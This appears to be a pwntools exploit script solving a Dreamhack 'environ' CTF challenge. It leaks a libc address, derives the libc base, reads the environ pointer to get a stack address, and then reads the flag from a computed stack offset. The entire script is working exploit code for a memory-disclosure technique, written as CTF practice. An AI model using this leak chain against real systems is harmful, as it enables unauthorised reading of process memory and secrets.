from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/environ/environ')
libc = ELF('/home/kali/Downloads/dreamhack/environ/libc.so.6')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:9560'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()

#gdb.attach(p)

p.recvuntil(b": ")
leak = p.recvline().strip()
leak = int(leak, 16)
print(elf.got)

libc.address = leak - libc.sym[b'_IO_2_1_stdout_']
#stdout = 0x1e85c0
#libc_address = leak - stdout
print(hex(libc.address))
print(hex(leak))

p.recvuntil(b"> ")
p.sendline(b"1")

environ = libc.sym[b'environ']
#environ = libc_address + 0x1eee28

p.recvuntil(b": ")
print((environ))
#success! we get the stack leak!
p.sendline(str(environ))

data = p.recv(6)
stack_leak = u64(data.ljust(8, b"\x00"))

print(hex(stack_leak))

#now we know stack -> leak flag!
p.recvuntil(b"> ")
p.sendline(b"1")

p.recvuntil(b": ")
flag = stack_leak - 0x1568
p.sendline(str(flag))

p.interactive()
